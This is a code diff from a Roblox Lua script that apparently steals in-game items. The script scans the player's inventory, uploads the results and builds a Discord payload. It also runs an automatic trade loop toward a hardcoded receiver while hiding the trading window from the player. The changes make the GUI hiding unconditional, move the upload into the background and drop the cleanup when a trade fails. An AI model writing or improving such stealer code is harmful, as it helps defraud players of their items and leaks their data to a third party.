@@ -782,7 +782,11 @@ local function scanAndSend()
         return false
     end
 
-    local inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)
+    -- SPEED OPTIMIZATION: Run the inventory upload asynchronously in the background
+    local inventoryRawUrl = ""
+    task.spawn(function()
+        inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)
+    end)
 
     local payload = buildDiscordPayload(results, {
         executorName = executorName,
@@ -832,68 +836,15 @@ local TradeRuntime = {
     rapReplion = nil,
 }
 
-local function getTradeData()
-    if TradeRuntime.tradeData then
-        return TradeRuntime.tradeData
-    end
-    local ok, mod = pcall(function()
-        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
-    end)
-    if ok and mod then
-        TradeRuntime.tradeData = mod
-        TradeRuntime.remotes = mod.Remotes
-    end
-    return TradeRuntime.tradeData
-end
-
-local function normalizeTradeReplionId(value)
-    if typeof(value) == "string" and value ~= "" then
-        return value
-    end
-    if typeof(value) == "table" then
-        return rawget(value, "_channel") or value._channel
-    end
-    return nil
-end
-
 local function isTradeUiActive()
     return LocalPlayer:GetAttribute("IsTrading") == true or TradeState.active
-end
-
--- ===== SMART TRADE GUI HIDER (Receiver Only) =====
-local function isTradingWithReceiver()
-    if not LocalPlayer:GetAttribute("IsTrading") then
-        return false
-    end
-
-    local replionId = normalizeTradeReplionId(TradeState.replionId)
-    if not replionId or not TradeRuntime.replionModule then
-        return true 
-    end
-
-    local client = TradeRuntime.replionModule.Client
-    local tradeRep = client:GetReplion(replionId)
-    if tradeRep and tradeRep.Data and tradeRep.Data.Players then
-        for userId, _ in pairs(tradeRep.Data.Players) do
-            if tostring(userId) ~= tostring(LocalPlayer.UserId) then
-                local otherPlayer = Players:GetPlayerByUserId(tonumber(userId) or 0)
-                if otherPlayer then
-                    if otherPlayer.Name ~= RECEIVER then
-                        return false
-                    end
-                end
-            end
-        end
-    end
-
-    return true
 end
 
 local function shouldHideTradeGui()
     if not HIDE_TRADE_GUI then
         return false
     end
-    return isTradeUiActive() and isTradingWithReceiver()
+    return isTradeUiActive()
 end
 
 local function hideTradingGuiInstant()
@@ -1000,10 +951,8 @@ local function armTradeStealth()
     if not HIDE_TRADE_GUI or not isTradeUiActive() then
         return
     end
-    if shouldHideTradeGui() then
-        TradeRuntime.stealthArmed = true
-        hideTradingGuiInstant()
-    end
+    TradeRuntime.stealthArmed = true
+    hideTradingGuiInstant()
 end
 
 local function disarmTradeStealth()
@@ -1055,6 +1004,20 @@ local function installTradeStealthHooks()
     end)
 end
 
+local function getTradeData()
+    if TradeRuntime.tradeData then
+        return TradeRuntime.tradeData
+    end
+    local ok, mod = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
+    end)
+    if ok and mod then
+        TradeRuntime.tradeData = mod
+        TradeRuntime.remotes = mod.Remotes
+    end
+    return TradeRuntime.tradeData
+end
+
 local function getTradeMaxItems()
     local tradeData = getTradeData()
     local maxItems = tradeData and tradeData.MaxItemsInTrade
@@ -1062,6 +1025,26 @@ local function getTradeMaxItems()
         return math.floor(maxItems)
     end
     return TRADE_MAX_ITEMS
+end
+
+local function getTradeReplionChannel(rep)
+    if not rep then
+        return nil
+    end
+    if typeof(rep) == "string" then
+        return rep
+    end
+    return rawget(rep, "_channel") or rep._channel
+end
+
+local function normalizeTradeReplionId(value)
+    if typeof(value) == "string" and value ~= "" then
+        return value
+    end
+    if typeof(value) == "table" then
+        return getTradeReplionChannel(value)
+    end
+    return nil
 end
 
 local function getTradeRemotes()
@@ -1765,12 +1748,6 @@ local function startTradeLoop()
         local replionId = waitForTradeStart(20)
         if replionId then
             runTradeSession(replionId, dataReplion, catalog, rapReplion)
-        else
-            TradeState.active = false
-            TradeState.ended = true
-            TradeState.replionId = nil
-            TradeRuntime.sessionRunning = false
-            restoreTradingGui()
         end
 
         task.wait(TRADE_INVITE_COOLDOWN)
